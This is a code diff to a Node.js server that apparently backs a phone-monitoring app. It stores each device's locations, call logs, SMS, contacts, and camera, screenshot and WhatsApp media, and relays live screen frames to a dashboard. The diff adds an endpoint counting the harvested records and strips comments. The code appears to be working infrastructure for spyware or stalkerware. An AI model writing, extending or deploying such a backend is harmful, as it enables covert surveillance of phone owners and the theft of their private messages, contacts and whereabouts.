@@ -183,7 +183,7 @@ const MediaSchema = new mongoose.Schema({
     deviceId: { type: String, required: true, index: true },
     url: String,
     publicId: String,
-    type: String, // camera, screenshot, whatsapp, download, video
+    type: String,
     fileName: String,
     timestamp: { type: Date, default: Date.now }
 }, { timestamps: true });
@@ -201,6 +201,22 @@ const Battery = mongoose.model('Battery', BatterySchema);
 const Network = mongoose.model('Network', NetworkSchema);
 const Media = mongoose.model('Media', MediaSchema);
 
+// ============= 🔥 NEW: GET STATS =============
+app.get('/api/stats', async (req, res) => {
+    try {
+        const stats = {
+            locations: await Location.countDocuments(),
+            callLogs: await CallLog.countDocuments(),
+            sms: await Sms.countDocuments(),
+            contacts: await Contact.countDocuments(),
+            media: await Media.countDocuments()
+        };
+        res.json({ success: true, stats });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
 // ============= WEBSOCKET FOR LIVE SCREEN =============
 wss.on('connection', (ws) => {
     console.log('🟢 WebSocket Client Connected');
@@ -210,7 +226,6 @@ wss.on('connection', (ws) => {
             const message = JSON.parse(data);
 
             if (message.type === 'screen_frame') {
-                // Broadcast to all connected dashboard clients
                 wss.clients.forEach(client => {
                     if (client !== ws && client.readyState === WebSocket.OPEN) {
                         client.send(JSON.stringify({
@@ -440,7 +455,6 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
         let url = '';
         let publicId = '';
 
-        // Upload to Cloudinary if configured
         if (process.env.CLOUDINARY_URL) {
             try {
                 const result = await cloudinary.uploader.upload(req.file.path, {
@@ -449,20 +463,15 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
                 });
                 url = result.secure_url;
                 publicId = result.public_id;
-
-                // Delete local file after upload
                 fs.unlinkSync(req.file.path);
             } catch (cloudinaryError) {
                 console.error('Cloudinary upload failed:', cloudinaryError);
-                // Fallback to local storage
                 url = `/uploads/${req.file.filename}`;
             }
         } else {
-            // Local storage fallback
             url = `/uploads/${req.file.filename}`;
         }
 
-        // Save to database
         const media = new Media({
             deviceId,
             url,
@@ -480,7 +489,7 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
     }
 });
 
-// ============= 🔥 NEW: GET LATEST PHOTO =============
+// ============= GET LATEST PHOTO =============
 app.get('/api/photo/:deviceId', async (req, res) => {
     try {
         const { deviceId } = req.params;
@@ -512,7 +521,7 @@ app.get('/api/photo/:deviceId', async (req, res) => {
     }
 });
 
-// ============= 🔥 NEW: GET LATEST VIDEO =============
+// ============= GET LATEST VIDEO =============
 app.get('/api/video/:deviceId', async (req, res) => {
     try {
         const { deviceId } = req.params;
@@ -677,6 +686,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ║  🔌 WebSocket: ws://localhost:8080           ║
     ║  🗄️  MongoDB: ${mongoose.connection.readyState === 1 ? '✅' : '❌'}                    ║
     ║  ☁️  Cloudinary: ${process.env.CLOUDINARY_URL ? '✅' : '❌'}              ║
+    ║  📊 Stats API: /api/stats                    ║
     ║  📸 Photo API: /api/photo/:deviceId         ║
     ║  🎥 Video API: /api/video/:deviceId         ║
     ╚══════════════════════════════════════════════╝
